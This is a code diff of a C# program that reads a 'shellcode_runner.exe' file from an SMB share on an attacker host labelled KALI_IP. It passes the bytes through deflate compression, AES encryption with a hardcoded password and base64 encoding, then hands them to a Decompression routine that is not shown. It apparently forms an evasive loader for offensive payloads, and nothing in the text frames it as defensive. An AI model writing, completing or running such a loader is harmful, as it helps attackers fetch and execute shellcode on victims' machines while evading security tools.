@@ -1,12 +1,8 @@
 using System;
 using System.IO;
 using System.Security.Cryptography;
-using System.Collections.Generic;
-using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
-using System.Reflection;
-using System.IO.Compression;
+using System.Net;
 
 namespace Compr_Decompr_b64
 {
@@ -104,25 +100,25 @@ namespace Compr_Decompr_b64
             
 
         }
-        public static void ruleThemAll(string file)
+        public static void ruleThemAll(byte[] runnerBytes)
         {
             byte[] passwordBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("6rtDJKyeH8KElfpqRp31!"));
             var outputStream = new System.IO.MemoryStream();
-            
-            var contents = File.ReadAllBytes(file);
+            byte[] contents = runnerBytes;
 
             using (var deflateStream = new System.IO.Compression.DeflateStream(outputStream, System.IO.Compression.CompressionMode.Compress))
-                deflateStream.Write(contents,0,contents.Length);
+                deflateStream.Write(contents, 0, contents.Length);
             var outputBytes = outputStream.ToArray();
-            var enc_bytes = AES_Encrypt(outputBytes,passwordBytes);
+            var enc_bytes = AES_Encrypt(outputBytes, passwordBytes);
             var deflate_b64 = Convert.ToBase64String(AES_Decrypt(enc_bytes, passwordBytes));
             Decompression(deflate_b64);
         }
 
         public static void Main(string[] args)
         {
-            ruleThemAll("\\\\KALI_IP\\visualstudio\\shellcode_runner.exe");
-           
+            byte[] contents = File.ReadAllBytes("\\\\KALI_IP\\visualstudio\\shellcode_runner.exe");
+            ruleThemAll(contents);
+
         }
     }
 }
